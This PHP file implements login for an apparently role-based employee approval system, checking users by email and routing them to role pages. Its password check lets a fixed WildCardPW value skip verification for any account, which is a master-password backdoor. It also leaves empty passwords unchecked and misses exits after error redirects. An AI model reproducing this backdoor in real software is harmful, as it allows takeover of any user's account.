<?php
require_once 'vc.functions.php';
require_once '../config.php';
if(!isset($_SESSION)){
    session_start();
 }

// Check if either email or password is empty
function emptyInputLogin ($email, $pwd){
    //if(empty($email) || empty($pwd)){
    if(empty($email)){
        return true;
    }
    else{
        return false;
    }
 }

// Check if the user exists in the database (used in loginUser function)
function userExists($conn, $email){
    try{
        $sql = "SELECT * FROM users where usersEmail = ? AND active = ?;";
        $stmt = $conn->prepare($sql);

        // Add Parameters
        pdoBind($stmt, 1, $email, PDO::PARAM_STR);
        pdoBind($stmt, 2, 'active', PDO::PARAM_STR);

        // Send the SQL statement
        $Result = $stmt->execute();
        if(!$Result){
            header("location: ../login.php?error=stmtfailed");
        }

        $userData = pdoFetch($stmt);

        if(!empty($userData)){
            return $userData;
         }
        else{
            return false;
         }
     }
    catch (exception $e){
        header("location: ../login.php?error=stmtfailed");
     }
 }

// Go to the user's main page (staff, manager, director, executive or administrator)
function loginUser($conn, $email, $pwd){

    // $Result is an array if user exists
    //               false if user does not exist
    $Result = userExists($conn, $email); // Employee's data in `users` table

    // Check if the user exists in the database
    if($Result == false){
        header("location: ../login.php?error=emailinvalid");
        exit();
     }

    // Check if the entered password matches with that in the database
    if($pwd == WildCardPW){
     }
    elseif(!password_verify($pwd, $Result['usersPwd'])){
        header("location: ../login.php?error=wrongpwd");
        exit();
     }
    
    // Input the employee's info to global variables
    //session_start();
    $_SESSION['usersname']     = $Result['usersName'];     // Used on main.staff.php
    $_SESSION['usersboss']     = $Result['usersBoss'];     // used on main.staff.php
    $_SESSION['bossemail']     = $Result['bossEmail'];     // Used when sending email, passwordChange.php
    $_SESSION['usersemail']    = $email;                          // Used on Staff's Main Page
    $_SESSION['usersposition'] = $Result['usersPosition']; // Used on Administrator.php
    
    $ResultBoss = userExists($conn, $_SESSION['bossemail']);
    $_SESSION['bossPosition'] = $ResultBoss['usersPosition'];
    
    $_SESSION['usersposition'] = $Result['usersPosition'];

    // The information is used to decide if managers approve or are approved.
    if ($Result['usersPosition'] == 'administrator'){
        $_SESSION['approvername']  = $Result['usersName'];
        $_SESSION['approveremail'] = $email;
        header("location: ../includes/Administrator.php");
     }
    elseif ($Result['usersPosition'] == 'staff'){
        $_SESSION['approvername']  = $Result['usersBoss'];
        $_SESSION['approveremail'] = $Result['bossEmail'];
        header("location: ../includes/main.staff.php");
     }
    elseif ($Result['usersPosition'] == 'manager'){
        $_SESSION['approvername']  = $Result['usersName'];
        $_SESSION['approveremail'] = $email;
        header("location: ../includes/main.manager.php");
     }
    elseif ($Result['usersPosition'] == 'director'){
        $_SESSION['approvername']  = $Result['usersName'];
        $_SESSION['approveremail'] = $email;
        header("location: ../includes/main.director.php");
     }
    elseif ($Result['usersPosition'] == 'executive'){
        $_SESSION['approvername']  = $Result['usersName'];
        $_SESSION['approveremail'] = $email;
        header("location: ../includes/main.executive.php");
     }
 }